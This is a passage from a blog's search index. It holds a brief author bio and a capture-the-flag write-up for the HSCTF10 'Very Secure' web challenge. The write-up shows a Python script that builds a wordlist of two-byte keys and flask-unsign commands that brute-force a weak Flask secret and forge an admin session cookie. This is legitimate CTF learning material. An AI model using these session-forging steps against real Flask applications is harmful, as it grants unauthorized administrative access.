Practitioner (CAP) INE Junior Penetration Tester (eJPTv2) (ISC)¬≤ Certified in Cyber Security (CC) ","date":"2023-08-08","objectID":"/whoami/:1:0","series":null,"tags":null,"title":"whoami","uri":"/whoami/#certifications"},{"categories":null,"content":" CTFA few years ago (2021), I got reincarnated into a CTF, and it became one of the reasons I pursued cybersecurity. Mainly because its challenging and interactive, and its like you‚Äôre playing a game. Related Accounts: TryHackMe, CTFTime, Discord ","date":"2023-08-08","objectID":"/whoami/:2:0","series":null,"tags":null,"title":"whoami","uri":"/whoami/#ctf"},{"categories":["CTF","Web"],"content":"Brute-force flask token, Lack of complexity","date":"2023-06-11","objectID":"/very-secure/","series":null,"tags":["Cryptographic Failures","Brute-force","Python","flask","flask Session","Code Review"],"title":"HSCTF10 - web/Very Secure","uri":"/very-secure/"},{"categories":["CTF","Web"],"content":"Write-up for HSCTF10 web challenge - Very Secure Description: This website is obviously 100% secure ","date":"2023-06-11","objectID":"/very-secure/:0:0","series":null,"tags":["Cryptographic Failures","Brute-force","Python","flask","flask Session","Code Review"],"title":"HSCTF10 - web/Very Secure","uri":"/very-secure/#"},{"categories":["CTF","Web"],"content":" SolutionSource Code: The flask secret is not complex. os.urandom(2) generates 65, 536 (256 * 256). which is brute-forcable. Reading the source also shows that to get the flag the session should be name = admin For the wordlist used in brute-forcing. I generated a wordlist file using the ff python script. This script generates all possible combinations from the os.urandom(2) with open(\"bytes_list.txt\", \"w\") as file: lines = [] for byte1 in range(256): for byte2 in range(256): lines.append(str(bytes([byte1, byte2]))+ \"\\n\") file.writelines(lines) To solve, finding the secret key and setting the session name to admin is required. First get a sample session cookie from a website. Flask tokens can be brute-forced using the tool flask-unsign flask-unsign --wordlist \u003cwordlist\u003e --unsign --cookie \u003ccookie\u003e The following command generates a new flask session. flask-unsign --cookie \"{'name': 'admin'}\" --secret \"b'\\xe4\\x89'\" Change session token on the site to get the flag ","date":"2023-06-11","objectID":"/very-secure/:0:0","series":null,"tags":["Cryptographic Failures","Brute-force","Python","flask","flask Session","Code Review"],"title":"HSCTF10 - web/Very Secure","uri":"/very-secure/#solution"},{"categories":["CTF","Web"],"content":" Flagflag: flag{h0w_d1d_y0u_cr4ck_th3_k3y??} ","date":"2023-06-11","objectID":"/very-secure/:0:0","series":null,"tags":["Cryptographic Failures","Brute-force","Python","flask","flask Session","Code Review"],"title":"HSCTF10 - web/Very Secure","uri":"/very-secure/#flag"},{"categories":["CTF","Web"],"content":" Attack Chain Learn that the flask secret is not complex Get a sample session cookie from the website Generate bytes wordlist using python brute-force secret: flask-unsign --wordlist bytes_list.txt --unsign --cookie $cookie generate cookie: flask-unsign --cookie \"{'name': 'admin'}\" --secret $secret Change session token on the website ","date":"2023-06-11","objectID":"/very-secure/:0:0","series":null,"tags":["Cryptographic Failures","Brute-force","Python","flask","flask Session","Code Review"],"title":"HSCTF10 - web/Very Secure","uri":"/very-secure/#attack-chain"}]